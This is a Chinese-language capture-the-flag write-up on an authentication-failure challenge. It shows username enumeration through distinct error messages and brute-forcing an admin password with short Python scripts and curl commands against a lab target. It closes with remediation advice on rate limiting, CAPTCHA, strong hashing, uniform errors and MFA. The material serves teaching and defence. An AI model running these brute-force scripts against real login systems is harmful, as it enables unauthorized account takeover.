# A07 Authentication Failures - Easy WriteUP

## 认证机制分析

本题目是一个基于 Flask + SQLite 的登录系统：
- 用户名明文比对
- 密码使用 SHA256 哈希存储
- 登录失败返回明确的错误信息（"用户不存在" / "密码错误"），可用于枚举用户名
- **没有任何防暴力破解机制**：无验证码、无登录失败次数限制、无IP封锁

## 攻击原理

弱密码 + 无防护 = 暴力破解成功。

攻击者可以利用系统返回的差异化错误信息，确认用户存在后，对密码字典进行逐个尝试，直到找到正确密码。

## 攻击步骤

### 步骤1：确认目标用户存在

访问登录页面，输入 `admin` 和任意密码，发现返回 "密码错误"，说明 `admin` 用户存在。

### 步骤2：编写爆破脚本

```python
import hashlib
import requests

url = "http://target/login"
passwords = ['password123', 'admin123', '12345678', 'qwerty123']

for pwd in passwords:
    data = {
        'username': 'admin',
        'password': pwd
    }
    r = requests.post(url, data=data, allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] Password found: {pwd}")
        break
    else:
        print(f"[-] Tried: {pwd}")
```

### 步骤3：登录获取 Flag

使用找到的正确密码登录，访问 `/admin` 页面即可看到 Flag。

也可以用 curl：
```bash
# 先登录保存 cookie
curl -c cookies.txt -X POST http://target/login -d "username=admin" -d "password=admin123" -L

# 再访问 admin 页面
curl -b cookies.txt http://target/admin
```

## Python 完整利用脚本

```python
import hashlib
import requests

def brute_force(target_url):
    passwords = ['password123', 'admin123', '12345678', 'qwerty123']
    session = requests.Session()

    for pwd in passwords:
        resp = session.post(f"{target_url}/login", data={
            "username": "admin",
            "password": pwd
        }, allow_redirects=False)

        if resp.status_code == 302 and '/admin' in resp.headers.get('Location', ''):
            print(f"[+] Success! Password: {pwd}")
            admin_page = session.get(f"{target_url}/admin")
            # 提取 flag
            import re
            flag_match = re.search(r'flag\{[^}]+\}', admin_page.text)
            if flag_match:
                print(f"[+] Flag: {flag_match.group()}")
            return
        else:
            print(f"[-] Failed: {pwd}")

if __name__ == '__main__':
    brute_force("http://localhost:8087")
```

## 修复建议

1. **实施登录失败限制**：对同一IP或同一账户，在短时间内限制登录尝试次数（如5次/分钟）
2. **添加验证码**：登录时要求输入图形验证码或行为验证码
3. **密码复杂度策略**：强制要求密码包含大小写字母、数字和特殊字符，长度不少于12位
4. **使用强哈希算法**：使用 bcrypt、scrypt 或 Argon2，而非 SHA256
5. **统一错误信息**：登录失败时统一返回 "用户名或密码错误"，避免用户名枚举
6. **启用多因素认证（MFA）**：为管理员账户添加二次验证
